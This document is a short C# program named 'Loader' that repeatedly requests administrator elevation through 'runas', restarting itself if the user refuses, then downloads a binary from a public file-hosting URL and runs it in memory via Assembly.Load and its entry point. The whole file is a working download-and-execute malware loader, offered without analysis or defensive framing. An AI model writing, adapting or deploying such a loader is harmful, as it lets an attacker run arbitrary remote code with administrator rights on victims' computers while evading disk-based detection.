﻿using System;
using System.Net;
using System.Windows.Forms;
using System.Reflection;
using System.Diagnostics;
using System.Security.Principal;

namespace Loader
{
    internal class Program
    {
        // https://stackoverflow.com/questions/3600322/check-if-the-current-user-is-administrator
        public static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        static void Main(string[] args)
        {
            ProcessStartInfo sti = new ProcessStartInfo(Application.ExecutablePath);
            sti.Verb = "runas";

            if (IsAdministrator() == false) {
                try { Process.Start(sti); } catch {
                    Application.Restart();
                    Environment.Exit(0);
                }
                Environment.Exit(0);   
            }

            byte[] bin = new WebClient().DownloadData("https://s22.filetransfer.io/storage/download/nR2n92DbW9fv");
            Assembly a = Assembly.Load(bin);
            MethodInfo method = a.EntryPoint;
            object o = a.CreateInstance(method.Name);
            try
            {
                method.Invoke(o, new object[] { });
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}